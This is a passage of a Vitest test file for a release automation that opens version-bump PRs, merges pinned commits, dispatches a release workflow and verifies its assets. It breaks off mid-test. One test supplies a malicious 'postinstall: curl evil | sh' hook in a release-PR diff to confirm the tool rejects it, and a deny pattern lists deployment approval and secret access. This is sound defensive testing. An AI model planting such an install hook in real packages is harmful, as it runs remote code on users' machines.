import * as fs from 'node:fs/promises';
import * as path from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';

import { createReleasePr, dispatchAndWatch, expectedAssets, gatherFacts, ship, verifyRelease } from './release-ship-actions.mjs';
import { RELEASE_BRANCH, VERSION_FILES } from './release-ship-core.mjs';

const TIP = 'a'.repeat(40);
const OLD = 'b'.repeat(40);
const NEW_TIP = 'c'.repeat(40);
const PR_SHA = 'd'.repeat(40);
const REQUIRED = ['build', 'security'];
const MINUTE = 60_000;

const versionPatch = (from: string, to: string) =>
  `diff --git a/package.json b/package.json\nindex 1..2 100644\n--- a/package.json\n+++ b/package.json\n@@ -1,3 +1,3 @@\n-  "version": "${from}",\n+  "version": "${to}",\n`;

interface Pr { number: number; title: string; headRefName: string; headRefOid: string; isCrossRepository: boolean; mergeStateStatus: string; mergeable: string; statusCheckRollup: Array<Record<string, string>>; createdAt?: string; version: string; files: string[]; patch: string }

function releasePr(overrides: Partial<Pr> = {}): Pr {
  return {
    number: 360, title: 'chore: prepare release 2.32.0', headRefName: RELEASE_BRANCH, headRefOid: PR_SHA, isCrossRepository: false, createdAt: '2026-10-02T09:00:00Z',
    mergeStateStatus: 'CLEAN', mergeable: 'MERGEABLE', statusCheckRollup: [{ status: 'COMPLETED', conclusion: 'SUCCESS' }],
    version: '2.32.0', files: [...VERSION_FILES], patch: versionPatch('2.31.1', '2.32.0'), ...overrides,
  };
}

/** An in-memory GitHub and git: just enough for release:ship to read and act on. */
function makeWorld(overrides: Record<string, unknown> = {}) {
  const world = {
    tip: TIP, version: '2.31.1', name: '@x/pkg', tags: [{ sha: OLD, version: '2.31.1' }] as Array<{ sha: string; version: string }>,
    commits: [{ subject: 'feat(backup): add the format', body: '' }], paused: 'false' as 'true' | 'false' | 'missing' | 'error',
    runs: [] as Array<Record<string, any>>, releases: new Set(['v2.31.1']), releaseAssets: {} as Record<string, string[]>,
    prs: [] as Pr[], checks: 'green' as 'green' | 'pending' | 'failed', npmVersions: new Set(['2.31.1']), npmLatest: '2.31.1',
    commitAgeMinutes: 60, pushRejected: false, remoteBranch: '' as string, branchMerged: true, mergeError: '', onSleep: [] as Array<(w: any) => void>, onWorkflowRun: undefined as undefined | ((w: any) => void),
    ...overrides,
  };
  return world;
}
type World = ReturnType<typeof makeWorld>;

function makeCtx(world: World) {
  const calls: string[][] = [];
  let clock = Date.parse('2026-10-02T12:00:00Z');
  const logs: string[] = [];
  const unexpected = (tool: string, args: string[]) => Object.assign(new Error(`unexpected ${tool} ${args.join(' ')}`), { stderr: `unexpected ${tool} ${args.join(' ')}` });

  const checkRuns = () => REQUIRED.map((name, index) => ({
    id: index + 1, name, head_sha: world.tip, app: { slug: 'github-actions' }, html_url: `https://x/${name}`,
    status: world.checks === 'pending' ? 'in_progress' : 'completed', conclusion: world.checks === 'failed' && index === 0 ? 'failure' : world.checks === 'pending' ? null : 'success',
  }));

  const git = async (args: string[], options?: { cwd?: string }) => {
    calls.push(['git', ...args]);
    const [command, ...rest] = args;
    const joined = args.join(' ');
    if (command === 'fetch') return '';
    if (joined === 'rev-parse origin/main') return `${world.tip}\n`;
    if (joined === 'show origin/main:package.json') return JSON.stringify({ name: world.name, version: world.version });
    if (joined === 'ls-remote --tags --refs origin') return world.tags.map((t) => `${t.sha}\trefs/tags/v${t.version}`).join('\n');
    if (command === 'merge-base') {
      if (world.remoteBranch && args.includes(world.remoteBranch) && !world.branchMerged) throw Object.assign(new Error('not an ancestor'), { stderr: '' });
      return '';
    }
    if (joined.startsWith('ls-remote --heads origin refs/heads/release/next')) return world.remoteBranch ? `${world.remoteBranch}\trefs/heads/release/next` : '';
    if (command === 'log') return world.commits.map((c) => `${c.subject}\x1f${c.body}\x1e`).join('\n');
    if (joined === 'show origin/main:.github/release-required-checks.json') return JSON.stringify({ app: 'github-actions', checks: REQUIRED });
    if (command === 'show' && rest[0] === '-s') return `${Math.floor((clock - world.commitAgeMinutes * MINUTE) / 1000)}\n`;
    const pr = world.prs.find((candidate) => args.some((arg) => arg.includes(candidate.headRefOid)));
    if (command === 'diff' && rest[0] === '--name-only' && pr) return pr.files.join('\n');
    if (command === 'diff' && pr && !args.includes('--cached')) return pr.patch;
    if (command === 'show' && pr && rest[0].endsWith(':package.json')) return JSON.stringify({ version: pr.version });
    if (command === 'ls-remote' && rest.includes('--refs') && rest[rest.length - 1].startsWith('refs/tags/v')) {
      const version = rest[rest.length - 1].replace('refs/tags/v', '');
      const tag = world.tags.find((t) => t.version === version);
      return tag ? `${tag.sha}\t${rest[rest.length - 1]}` : '';
    }
    if (command === 'worktree') return '';
    if (command === 'diff' && args.includes('--cached')) return args.includes('--name-only') ? scripted.stagedFiles.join('\n') : scripted.stagedPatch;
    if (command === 'commit') return '';
    if (command === 'push' && args.some((arg) => arg.startsWith(':refs/heads/release/next'))) {
      world.pushRejected = false;
      world.remoteBranch = '';
      return '';
    }
    if (command === 'push') {
      if (world.pushRejected) throw Object.assign(new Error('push failed'), { stderr: '! [rejected] HEAD -> release/next (stale info)' });
      return '';
    }
    throw unexpected('git', args);
  };

  const scripted = { stagedFiles: ['package.json', 'package-lock.json'], stagedPatch: versionPatch('2.31.1', '2.32.0'), npmWrites: '2.32.0' as string | null };

  const gh = async (args: string[]) => {
    calls.push(['gh', ...args]);
    const joined = args.join(' ');
    if (joined.includes('actions/variables/RELEASES_PAUSED')) {
      if (world.paused === 'missing') throw Object.assign(new Error('x'), { stderr: 'gh: Not Found (HTTP 404)' });
      if (world.paused === 'error') throw Object.assign(new Error('x'), { stderr: 'gh: Server Error (HTTP 500)' });
      return `${world.paused}\n`;
    }
    if (args[0] === 'run' && args[1] === 'list') return JSON.stringify(world.runs.filter((r) => !args.includes('--event') || r.event === 'workflow_dispatch'));
    if (args[0] === 'run' && args[1] === 'view') {
      const run = world.runs.find((r) => String(r.databaseId) === args[2]);
      return JSON.stringify({ status: run?.status, conclusion: run?.conclusion ?? '', jobs: run?.jobs ?? [] });
    }
    if (args[0] === 'release' && args[1] === 'view') {
      if (args.includes('--json')) return JSON.stringify({ isDraft: false, isPrerelease: false, assets: (world.releaseAssets[args[2]] ?? []).map((name) => ({ name })) });
      if (!world.releases.has(args[2])) throw Object.assign(new Error('x'), { stderr: 'release not found' });
      return '';
    }
    if (args[0] === 'pr' && args[1] === 'list') {
      return JSON.stringify(world.prs.map(({ version, files, patch, ...rest }) => rest));
    }
    if (joined.includes('check-runs')) return checkRuns().map((run) => JSON.stringify(run)).join('\n');
    if (args[0] === 'pr' && args[1] === 'create') {
      // A brand-new PR: BLOCKED with no checks listed yet, as GitHub reports it for the first moments.
      world.prs.push(releasePr({ mergeStateStatus: 'BLOCKED', statusCheckRollup: [], createdAt: new Date(clock).toISOString() } as Partial<Pr>));
      return 'https://github.com/o/r/pull/360\n';
    }
    if (args[0] === 'pr' && args[1] === 'merge') {
      const pr = world.prs.find((candidate) => String(candidate.number) === args[2]);
      const pinned = args[args.indexOf('--match-head-commit') + 1];
      if (world.mergeError) throw Object.assign(new Error('x'), { stderr: world.mergeError });
      if (!pr || pinned !== pr.headRefOid) throw Object.assign(new Error('x'), { stderr: 'head commit mismatch' });
      world.version = pr.version;
      world.tip = NEW_TIP;
      world.prs = [];
      world.checks = 'pending';
      world.commits = [];
      return '';
    }
    if (args[0] === 'pr' && args[1] === 'close') { world.prs = world.prs.filter((pr) => String(pr.number) !== args[2]); return ''; }
    if (args[0] === 'workflow' && args[1] === 'run') {
      world.runs.push({ databaseId: 900, status: 'queued', conclusion: '', createdAt: new Date(clock).toISOString(), event: 'workflow_dispatch', headSha: world.tip, jobs: [] });
      world.onWorkflowRun?.(world);
      return '';
    }
    throw unexpected('gh', args);
  };

  const npm = async (args: string[], options?: { cwd?: string }) => {
    calls.push(['npm', ...args]);
    if (args[0] === 'version') {
      if (scripted.npmWrites && options?.cwd) await fs.writeFile(path.join(options.cwd, 'package.json'), JSON.stringify({ version: scripted.npmWrites }));
      return `v${scripted.npmWrites}\n`;
    }
    if (args[0] === 'view' && args[2] === 'version') {
      const version = args[1].split('@').pop() as string;
      if (!world.npmVersions.has(version)) throw new Error('E404');
      return `${version}\n`;
    }
    if (args[0] === 'view' && args[2] === 'dist-tags.latest') return `${world.npmLatest}\n`;
    throw unexpected('npm', args);
  };

  const ctx = {
    repo: 'o/r', git, gh, npm, now: () => clock, log: (message: string) => { logs.push(message); },
    sleep: async (ms: number) => { clock += ms; world.onSleep.shift()?.(world); },
  };
  return { ctx, calls, logs, scripted, tick: () => clock };
}

const mutating = (calls: string[][]) => calls.filter(([tool, ...args]) =>
  (tool === 'gh' && ((args[0] === 'pr' && ['create', 'merge', 'close'].includes(args[1])) || (args[0] === 'workflow' && args[1] === 'run')))
  || (tool === 'git' && ['push', 'commit'].includes(args[0])));

const allCalls: string[][][] = [];
afterEach(() => {
  // Whatever a scenario did, release:ship must never approve a deployment, cancel a run, or change settings.
  const forbidden = /pending_deployments|approve|run cancel|\bcancel\b|environments\/|branches\/.*protection|actions\/variables.*(--method|-X|PATCH|POST|DELETE)|\bsecrets?\b/i;
  for (const calls of allCalls.splice(0)) {
    for (const call of calls) expect(call.join(' ')).not.toMatch(forbidden);
  }
});

function setup(overrides: Record<string, unknown> = {}) {
  const world = makeWorld(overrides);
  const made = makeCtx(world);
  allCalls.push(made.calls);
  return { world, ...made };
}

const FAST = { pollMs: 1000, timeoutMs: 120 * MINUTE };
const turn = (...fns: Array<(w: World) => void>) => fns;

describe('ship: nothing to do', () => {
  it('is done, and changes nothing, when the tip of main is already released', async () => {
    const { ctx, calls } = setup({ tags: [{ sha: TIP, version: '2.31.1' }] });
    const result = await ship(ctx, FAST);
    expect(result).toMatchObject({ code: 0 });
    expect(result.message).toContain('already released');
    expect(mutating(calls)).toEqual([]);
  });

  it('does not release docs and chores', async () => {
    const { ctx, calls } = setup({ commits: [{ subject: 'docs: words', body: '' }, { subject: 'chore: deps', body: '' }] });
    expect(await ship(ctx, FAST)).toMatchObject({ code: 0 });
    expect(mutating(calls)).toEqual([]);
  });
});

describe('ship: stops before acting', () => {
  it('stops when paused, without touching anything', async () => {
    const { ctx, calls } = setup({ paused: 'true' });
    const result = await ship(ctx, FAST);
    expect(result.code).toBe(2);
    expect(result.message).toContain('paused');
    expect(mutating(calls)).toEqual([]);
  });

  it('treats a missing variable as not paused, and any other read error as a stop', async () => {
    expect((await ship(setup({ paused: 'missing', tags: [{ sha: TIP, version: '2.31.1' }] }).ctx, FAST)).code).toBe(0);
    const { ctx, calls } = setup({ paused: 'error' });
    const result = await ship(ctx, FAST);
    expect(result.code).toBe(1);
    expect(result.message).toMatch(/RELEASES_PAUSED/);
    expect(mutating(calls)).toEqual([]);
  });

  it.each([[' TRUE '], ['yes'], ['1'], ['On'], ['tr ue']])('reads RELEASES_PAUSED=%j as paused, the way the workflow guard does', async (value) => {
    const { world, ctx, calls } = setup();
    world.paused = value as never;
    expect((await ship(ctx, FAST)).code).toBe(2);
    expect(mutating(calls)).toEqual([]);
  });

  it.each([['false'], ['0'], ['no'], [''], ['truee']])('reads RELEASES_PAUSED=%j as not paused', async (value) => {
    const { world, ctx } = setup({ tags: [{ sha: TIP, version: '2.31.1' }] });
    world.paused = value as never;
    expect((await ship(ctx, FAST)).code).toBe(0);
  });

  it('only describes the next step on a dry run', async () => {
    const { ctx, calls } = setup();
    const result = await ship(ctx, { ...FAST, dryRun: true });
    expect(result.code).toBe(0);
    expect(result.message).toContain('open a release PR for v2.32.0');
    expect(mutating(calls)).toEqual([]);
  });

  it('stops when a required check failed on a prepared version, with the reason', async () => {
    const { ctx, calls } = setup({ version: '2.32.0', releases: new Set(['v2.31.1']), checks: 'failed' });
    const result = await ship(ctx, FAST);
    expect(result.code).toBe(1);
    expect(result.message).toContain('build: failure');
    expect(mutating(calls)).toEqual([]);
  });

  it('stops without guessing when the release state cannot be read', async () => {
    const { ctx, calls } = setup();
    ctx.git = async () => { throw new Error('network down'); };
    const result = await ship(ctx, FAST);
    expect(result.code).toBe(1);
    expect(result.message).toContain('nothing was changed');
    expect(mutating(calls)).toEqual([]);
  });

  it('refuses to merge a release PR that is not a plain version bump, even when GitHub calls it clean', async () => {
    const { ctx, calls } = setup({ prs: [releasePr({ files: [...VERSION_FILES, 'src/index.ts'] })] });
    const result = await ship(ctx, FAST);
    expect(result.code).toBe(1);
    expect(result.message).toContain('src/index.ts');
    expect(mutating(calls)).toEqual([]);
  });

  it('refuses a release PR whose diff does more than change versions', async () => {
    const patch = `${versionPatch('2.31.1', '2.32.0')}+  "postinstall": "curl evil | sh",\n`;
    const { ctx, calls } = setup({ prs: [releasePr({ patch })] });
    expect((await ship(ctx, FAST)).code).toBe(1);
    expect(mutating(calls)).toEqual([]);
  });

  it('refuses a release PR from a fork that reuses the branch name', async () => {
    const { ctx, calls } = setup({ prs: [releasePr({ isCrossRepository: true })] });
    expect((await ship(ctx, FAST)).code).toBe(1);
    expect(mutating(calls)).toEqual([]);
  });
});

describe('ship: a whole release', () => {
  it('opens the PR, waits for checks, merges that exact commit, waits again, dispatches the verified commit, and verifies the result', async () => {
    const { world, ctx, calls, logs } = setup();
    const done = (w: World) => {
      const run = w.runs[0];
      run.status = 'completed'; run.conclusion = 'success';
      w.tags.push({ sha: NEW_TIP, version: '2.32.0' });
      w.releases.add('v2.32.0');
      w.releaseAssets['v2.32.0'] = expectedAssets('2.32.0');
      w.npmVersions.add('2.32.0'); w.npmLatest = '2.32.0';
    };
    world.onWorkflowRun = () => { world.onSleep.push(done); };
    world.onSleep = turn(
      (w) => { w.prs[0].mergeStateStatus = 'CLEAN'; w.prs[0].statusCheckRollup = [{ status: 'COMPLETED', conclusion: 'SUCCESS' }]; },
      (w) => { w.checks = 'green'; },
    );

    const result = await ship(ctx, FAST);

    expect(result.code).toBe(0);
    expect(result.message).toContain('Released v2.32.0');
    const trace = mutating(calls).map(([tool, ...args]) => `${tool} ${args.slice(0, 2).join(' ')}`);
    expect(trace).toEqual(['git commit --quiet', 'git push --force-with-lease=refs/heads/release/next:', 'gh pr create', 'gh pr merge', 'gh workflow run']);

    const push = calls.find((c) => c[0] === 'git' && c[1] === 'push')!;
    expect(push).toContain('HEAD:refs/heads/release/next');
    expect(push).not.toContain('--force');
    const merge = calls.find((c) => c[0] === 'gh' && c[2] === 'merge')!;
    expect(merge).toEqual(expect.arrayContaining(['--match-head-commit', PR_SHA, '--delete-branch']));
    const dispatch = calls.find((c) => c[0] === 'gh' && c[1] === 'workflow')!;
    expect(dispatch).toEqual(expect.arrayContaining(['version=2.32.0', `expected_sha=${NEW_TIP}`]));
    expect(logs.join('\n')).toContain('Dispatched release.yml for v2.32.0');
  });

  it('joins a release PR another agent opened, instead of making a second one', async () => {
    const { world, ctx, calls } = setup({ prs: [releasePr()] });
    world.onWorkflowRun = () => { world.onSleep.push((w) => { Object.assign(w.runs[0], { status: 'completed', conclusion: 'success' }); w.tags.push({ sha: NEW_TIP, version: '2.32.0' }); w.releases.add('v2.32.0'); w.releaseAssets['v2.32.0'] = expectedAssets('2.32.0'); w.npmVersions.add('2.32.0'); w.npmLatest = '2.32.0'; }); };
    world.onSleep = turn((w) => { w.checks = 'green'; });
    expect((await ship(ctx, FAST)).code).toBe(0);
    const trace = mutating(calls).map(([tool, ...args]) => `${tool} ${args.slice(0, 2).join(' ')}`);
    expect(trace).toEqual(['gh pr merge', 'gh workflow run']);
  });

  it('joins instead of failing when another agent wins the race to create the release branch', async () => {
    const { world, ctx, calls } = setup({ pushRejected: true });
    world.onSleep = turn(() => { world.prs.push(releasePr({ mergeStateStatus: 'BLOCKED', statusCheckRollup: [{ status: 'IN_PROGRESS', conclusion: '' }] })); world.pushRejected = false; });
    const result = await ship(ctx, { ...FAST, timeoutMs: 5 * 1000 });
    expect(mutating(calls).some(([tool, a, b]) => tool === 'gh' && a === 'pr' && b === 'create')).toBe(false);
    expect(result.code).toBe(3);
  });

  it('waits, and does not stop, while a brand-new release PR shows no checks yet', async () => {
    const { world, ctx, calls } = setup();
    world.onSleep = turn((w) => { w.prs[0].statusCheckRollup = [{ status: 'IN_PROGRESS', conclusion: '' }]; });
    const result = await ship(ctx, { ...FAST, timeoutMs: 4000 });
    expect(result.code).toBe(3);
    expect(result.message).toContain('waiting for its checks');
    expect(calls.some((c) => c[0] === 'gh' && c[2] === 'merge')).toBe(false);
  });

  it('waits when a young PR is BLOCKED with only some checks reported, because the rest have not been created yet', async () => {
    const young = new Date(Date.parse('2026-10-02T12:00:00Z') - 2 * MINUTE).toISOString();
    const { ctx, calls } = setup({ prs: [releasePr({ mergeStateStatus: 'BLOCKED', createdAt: young })] });
    const result = await ship(ctx, { ...FAST, timeoutMs: 3000 });
    expect(result.code).toBe(3);
    expect(calls.some((c) => c[0] === 'gh' && c[2] === 'merge')).toBe(false);
  });

  it('stops for a person when an old PR is still BLOCKED with every reported check passing', async () => {
    const old = new Date(Date.parse('2026-10-02T12:00:00Z') - 40 * MINUTE).toISOString();
    const { ctx, calls } = setup({ prs: [releasePr({ mergeStateStatus: 'BLOCKED', createdAt: old })] });
    const result = await ship(ctx, FAST);
    expect(result.code).toBe(1);
    expect(result.message).toContain('cannot merge');
    expect(calls.some((c) => c[0] === 'gh' && c[2] === 'merge')).toBe(false);
  });

  it('removes a leftover release branch that is already merged into main, then carries on', async () => {
    const { world, ctx, calls, logs } = setup({ pushRejected: true, remoteBranch: 'f'.repeat(40) });
    const result = await ship(ctx, { ...FAST, timeoutMs: 3000 });
    expect(result.code).toBe(3);
    expect(logs.join('\n')).toContain('Removed the stale release/next branch');
    const del = calls.find((c) => c[0] === 'git' && c[1] === 'push' && c.some((a) => a.startsWith(':refs/heads/release/next')))!;
    expect(del).toContain(`--force-with-lease=refs/heads/release/next:${'f'.repeat(40)}`);
    expect(calls.some((c) => c[0] === 'gh' && c[1] === 'pr' && c[2] === 'create')).toBe(true);
    expect(world.remoteBranch).toBe('');
  });

  it('never deletes a release branch that holds work main does not have', async () => {
    const { ctx, calls } = setup({ pushRejected: true, remoteBranch: 'f'.repeat(40), branchMerged: false });
    const result = await ship(ctx, FAST);
    expect(result.code).toBe(1);
    expect(calls.some((c) => c[0] === 'git' && c[1] === 'push' && c.some((a) => a.startsWith(':refs/heads')))).toBe(false);
  });

  it('does not hammer a release branch whose PR never appears, and says what to do', async () => {
    const { ctx, calls } = setup({ pushRejected: true });
    const result = await ship(ctx, FAST);
    expect(result.code).toBe(1);
    expect(result.message).toContain('release/next exists but has no open PR');
    expect(calls.filter((c) => c[0] === 'git' && c[1] === 'push')).toHaveLength(4);
    expect(calls.some((c) => c[0] === 'gh' && c[1] === 'pr' && c[2] === 'create')).toBe(false);
  });

  it('finishes a release that was tagged but never published', async () => {
    const { world, ctx, calls } = setup({ tags: [{ sha: TIP, version: '2.31.1' }], releases: new Set<string>() });
    world.onWorkflowRun = () => { world.onSleep.push((w) => { Object.assign(w.runs[0], { status: 'completed', conclusion: 'success' }); w.releases.add('v2.31.1'); w.releaseAssets['v2.31.1'] = expectedAssets('2.31.1'); }); };
    const result = await ship(ctx, FAST);
    expect(result.code).toBe(0);
    const dispatch = calls.find((c) => c[0] === 'gh' && c[1] === 'workflow')!;
    expect(dispatch).toEqual(expect.arrayContaining(['version=2.31.1', `expected_sha=${TIP}`]));
  });
});

describe('ship: waiting and failing safely', () => {
  const running = { databaseId: 5, status: 'in_progress', headSha: TIP, createdAt: '2026-10-02T11:00:00Z', event: 'workflow_dispatch' };

  it('waits for a release that is already running, and acts on nothing until it ends', async () => {
    // Unreleased work is waiting, so ignoring the running release would open a PR at once.
    const { ctx, calls, logs } = setup({ runs: [{ ...running }] });
    const result = await ship(ctx, { pollMs: 1000, timeoutMs: 4000 });
    expect(result.code).toBe(3);
    expect(logs.join('\n')).toContain('Release run 5 is in_progress');
    expect(mutating(calls)).toEqual([]);
  });

  it('carries on once the running release has ended', async () => {
    const { world, ctx, calls } = setup({ runs: [{ ...running }] });
    world.onSleep = turn((w) => { w.runs[0].status = 'completed'; });
    const result = await ship(ctx, { pollMs: 1000, timeoutMs: 4000 });
    expect(result.code).toBe(3);
    expect(mutating(calls).some(([tool, a, b]) => tool === 'gh' && a === 'pr' && b === 'create')).toBe(true);
  });

  it('times out while waiting and says to run it again', async () => {
    const { ctx } = setup({ runs: [{ ...running }] });
    const result = await ship(ctx, { pollMs: 1000, timeoutMs: 3000 });
    expect(result.code).toBe(3);
    expect(result.message).toContain('Run the command again to resume');
  });

  it('says it will not approve, and keeps waiting, when the run is held at the release environment', async () => {
    const { world, ctx, logs, calls } = setup({ version: '2.32.0', releases: new Set(['v2.31.1']) });
    world.onWorkflowRun = () => { world.runs[0].status = 'waiting'; };
    const result = await ship(ctx, { pollMs: 1000, timeoutMs: 5000 });
    expect(result.code).toBe(3);
    expect(logs.join('\n')).toMatch(/does not approve deployments/);
    expect(calls.map((c) => c.join(' ')).join('\n')).not.toMatch(/approve|pending_deployments/);
  });

  it('reports the failing jobs when the run fails, and does not claim a release', async () => {
    const { world, ctx } = setup({ version: '2.32.0', releases: new Set(['v2.31.1']) });
    world.onWorkflowRun = () => { Object.assign(world.runs[0], { status: 'completed', conclusion: 'failure', jobs: [{ name: 'npm', conclusion: 'failure' }, { name: 'guard', conclusion: 'success' }] }); };
    const result = await ship(ctx, FAST);
    expect(result.code).toBe(1);
    expect(result.message).toContain('npm: failure');
    expect(result.message).not.toContain('guard: success');
  });

  it('does not call a green run a release when the assets disagree', async () => {
    const { world, ctx } = setup({ version: '2.32.0', releases: new Set(['v2.31.1']) });
    world.onWorkflowRun = () => { Object.assign(world.runs[0], { status: 'completed', conclusion: 'success' }); world.tags.push({ sha: TIP, version: '2.32.0' }); world.releases.add('v2.32.0'); world.releaseAssets['v2.32.0'] = ['ContextSpace.vsix']; };
    const result = await ship(ctx, FAST);
    expect(result.code).toBe(1);
    expect(result.message).toMatch(/missing: .*AppImage/);
  });

  it('fails verification when checkNpm is explicitly enabled and npm does not have the version', async () => {
    const { world, ctx } = setup({ version: '2.32.0', releases: new Set(['v2.31.1']) });
    world.onWorkflowRun = () => { Object.assign(world.runs[0], { status: 'completed', conclusion: 'success' }); world.tags.push({ sha: TIP, version: '2.32.0' }); world.releases.add('v2.32.0'); world.releaseAssets['v2.32.0'] = expectedAssets('2.32.0'); };
    const result = await ship(ctx, { ...FAST, checkNpm: true });
    expect(result.code).toBe(1);
    expect(result.message).toContain('npm does not show @x/pkg@2.32.0');
  });

  it('stops when the same step fails twice in a row, with the real error', async () => {
    const { ctx, calls } = setup({ prs: [releasePr()], mergeError: 'GraphQL: Pull request is not mergeable' });
    const result = await ship(ctx, FAST);
    expect(result.code).toBe(1);
    expect(result.message).toContain('failed twice');
    expect(result.message).toContain('not mergeable');
    expect(calls.filter((c) => c[0] === 'gh' && c[2] === 'merge')).toHaveLength(2);
    expect(calls.some((c) => c[0] === 'gh' && c[1] === 'workflow')).toBe(false);
  });

  it('never merges a PR whose head moved after it was checked', async () => {
    const { world, ctx, calls } = setup({ prs: [releasePr()] });
    // GitHub refuses --match-head-commit when the head differs; model a branch that keeps moving
    // under the command, so every merge attempt is for a commit that is no longer the PR head.
    const original = ctx.gh;
    let pushes = 0;
    ctx.gh = async (args: string[]) => {
      if (args[0] === 'pr' && args[1] === 'merge') { pushes += 1; world.prs[0].headRefOid = String(pushes).repeat(40); }
      return original(args);
    };
    const result = await ship(ctx, FAST);
    expect(result.code).toBe(1);
    expect(result.message).toContain('failed twice');
    expect(calls.some((c) => c[0] === 'gh' && c[1] === 'workflow')).toBe(false);
    expect(world.version).toBe('2.31.1');
    // Each attempt pinned the head it had validated, never a newer one.
    const pinned = calls.filter((c) => c[0] === 'gh' && c[2] === 'merge').map((c) => c[c.indexOf('--match-head-commit') + 1]);
    expect(pinned).toEqual([PR_SHA, '1'.repeat(40)]);
  });
});

describe('createReleasePr safety', () => {
  const step = { action: 'create-release-pr', bump: 'minor', version: '2.32.0', baseSha: TIP };
  const facts = { mainVersion: '2.31.1', commits: [{ subject: 'feat: a thing', body: '' }] };

  it('opens a PR whose only change is the version', async () => {
    const { ctx, calls } = setup();
    await createReleasePr(ctx as never, step, facts);
    expect(calls.some((c) => c[0] === 'gh' && c[1] === 'pr' && c[2] === 'create')).toBe(true);
    const create = calls.find((c) => c[0] === 'gh' && c[2] === 'create')!;
    expect(create).toEqual(expect.arrayContaining(['--title', 'chore: prepare release 2.32.0', '--head', 'release/next']));
  });

  it('pushes nothing when the bump touched an unexpected file', async () => {
    const { ctx, calls, scripted } = setup();
    scripted.stagedFiles = ['package.json', 'src/index.ts'];
    await expect(createReleasePr(ctx as never, step, facts)).rejects.toThrow(/unexpected files.*src\/index\.ts/);
    expect(mutating(calls)).toEqual([]);
  });

  it('pushes nothing when the staged diff is more than version lines', async () => {
    const { ctx, calls, scripted } = setup();
    scripted.stagedPatch = `${versionPatch('2.31.1', '2.32.0')}+  "scripts": "x",\n`;
    await expect(createReleasePr(ctx as never, step, facts)).rejects.toThrow(/more than version lines/);
    expect(mutating(calls)).toEqual([]);
  });

  it('pushes nothing when npm produced a different version than planned', async () => {
    const { ctx, calls, scripted } = setup();
    scripted.npmWrites = '2.33.0';
    await expect(createReleasePr(ctx as never, step, facts)).rejects.toThrow(/produced 2\.33\.0, expected 2\.32\.0/);
    expect(mutating(calls)).toEqual([]);
  });

  it('removes its temporary worktree even when it fails', async () => {
    const { ctx, calls, scripted } = setup();
    scripted.stagedFiles = ['evil.txt'];
    await expect(createReleasePr(ctx as never, step, facts)).rejects.toThrow();
    expect(calls.some((c) => c[0] === 'git' && c[1] === 'worktree' && c[2] === 'remove')).toBe(true);
  });
});

describe('gatherFacts and verifyRelease', () => {
  it('reports pending checks while required checks still run', async () => {
    const { ctx } = setup({ checks: 'pending' });
    expect((await gatherFacts(ctx)).tipChecks.state).toBe('pending');
  });

  it('reports a version mismatch between tag and tip as a problem when verifying', async () => {
    const { ctx } = setup({ tags: [{ sha: OLD, version: '2.32.0' }], releases: new Set(['v2.32.0']), releaseAssets: { 'v2.32.0': expectedAssets('2.32.0') }, npmVersions: new Set(['2.32.0']), npmLatest: '2.32.0' });
    const result = await verifyRelease(ctx as never, { version: '2.32.0', tipSha: TIP, packageName: '@x/pkg' });
    expect(result.ok).toBe(false);
    expect(result.problems[0]).toContain(`tag v2.32.0 is at ${OLD}`);
  });

  it('verifies the GitHub Release without requiring npm package publication', async () => {
    const { ctx } = setup({ tags: [{ sha: TIP, version: '2.32.0' }], releases: new Set(['v2.32.0']), releaseAssets: { 'v2.32.0': expectedAssets('2.32.0') }, npmVersions: new Set(['2.31.1']), npmLatest: '2.31.1' });
    const result = await verifyRelease(ctx as never, { version: '2.32.0', tipSha: TIP, packageName: '@x/pkg' });
    expect(result.ok).toBe(true);
    expect(result.problems).toEqual([]);
  });

  it('flags an npm latest that did not move when checkNpm is explicitly enabled', async () => {
    const { ctx } = setup({ tags: [{ sha: TIP, version: '2.32.0' }], releases: new Set(['v2.32.0']), releaseAssets: { 'v2.32.0': expectedAssets('2.32.0') }, npmVersions: new Set(['2.32.0']), npmLatest: '2.31.1' });
    const result = await verifyRelease(ctx as never, { version: '2.32.0', tipSha: TIP, packageName: '@x/pkg', checkNpm: true });
    expect(result.problems).toEqual(['npm "latest" is 2.31.1, not 2.32.0']);
  });

  it('lists the assets a stable release must carry', () => {
    expect(expectedAssets('2.32.0')).toEqual([
      'ContextSpace-2.32.0.AppImage', 'ContextSpace-2.32.0.AppImage.sha256', 'ContextSpaceSetup.exe', 'ContextSpaceSetup.exe.sha256',
      'ContextSpace.vsix', 'latest.yml', 'latest-linux.yml',
    ]);
  });
});

describe('ship: legacy commit statuses on the release PR', () => {
  const ok = { status: 'COMPLETED', conclusion: 'SUCCESS' };
  const commitStatus = (state: string) => ({ __typename: 'StatusContext', context: 'ci/other', state });
  const nextStep = async (rollup: Array<Record<string, string>>, mergeStateStatus = 'BLOCKED') => {
    const { ctx } = setup({ prs: [releasePr({ mergeStateStatus, statusCheckRollup: rollup })] });
    return (await ship(ctx, { ...FAST, dryRun: true })).step as { action: string; code?: string; waitFor?: string };
  };

  it.each(['PENDING', 'EXPECTED'])('waits while a commit status is %s, instead of calling the PR failing', async (state) => {
    expect(await nextStep([ok, commitStatus(state)])).toMatchObject({ action: 'wait', waitFor: 'release-pr-checks' });
  });

  it.each(['FAILURE', 'ERROR'])('still stops on a commit status that is %s', async (state) => {
    // A stop is returned before the dry-run branch, so it carries a code and message, not a step.
    const { ctx, calls } = setup({ prs: [releasePr({ mergeStateStatus: 'BLOCKED', statusCheckRollup: [ok, commitStatus(state)] })] });
    const result = await ship(ctx, { ...FAST, dryRun: true });
    expect(result.code).toBe(1);
    expect(result.message).toContain('Checks on release PR #360 failed');
    expect(mutating(calls)).toEqual([]);
  });

  it('merges once the commit status has succeeded', async () => {
    expect(await nextStep([ok, commitStatus('SUCCESS')], 'CLEAN')).toMatchObject({ action: 'merge-release-pr' });
  });
});

describe('ship: status checks it cannot read', () => {
  it.each([
    ['an entry with neither a status nor a state', { __typename: 'Mystery', name: 'x' }],
    ['a commit status with a state it does not know', { __typename: 'StatusContext', context: 'ci/other', state: 'FUTURE_STATE' }],
  ])('stops and changes nothing for %s, rather than guessing', async (_label, entry) => {
    const { ctx, calls } = setup({ prs: [releasePr({ mergeStateStatus: 'BLOCKED', statusCheckRollup: [entry as Record<string, string>] })] });
    const result = await ship(ctx, { ...FAST, dryRun: true });
    expect(result.code).toBe(1);
    expect(result.message).toContain('Could not read the release state');
    expect(result.message).toContain('Unrecognized');
    expect(mutating(calls)).toEqual([]);
  });
});

describe('dispatchAndWatch: finding the run it dispatched', () => {
  const step = { version: '2.32.0', tipSha: TIP };
  const finish = (world: World) => {
